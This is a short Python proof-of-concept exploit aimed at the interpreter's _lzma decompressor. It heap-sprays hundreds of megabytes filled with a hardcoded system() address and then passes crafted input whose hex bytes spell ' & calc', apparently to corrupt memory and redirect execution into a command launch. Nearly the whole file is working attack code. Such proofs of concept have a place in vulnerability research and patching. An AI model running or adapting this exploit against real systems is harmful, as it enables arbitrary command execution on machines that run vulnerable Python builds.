import _lzma
from array import *

# System address when tested: 76064070
d = _lzma.LZMADecompressor()
spray = [];
for x in range(0, 0x700):
    meg = bytearray(b'\x76\x70\x40\x06' * int(0x100000 / 4));        
    spray.append(meg)

def foo():    
    for x in range(0, 2):
        try:
            d.decompress(b"\x20\x26\x20\x63\x61\x6c\x63\x00\x41\x41\x41\x41\x41\x41\x41\x41" * int(0x100 / (4*4)))
        except:
            pass
foo()
print(len(spray[0]))
print(len(spray))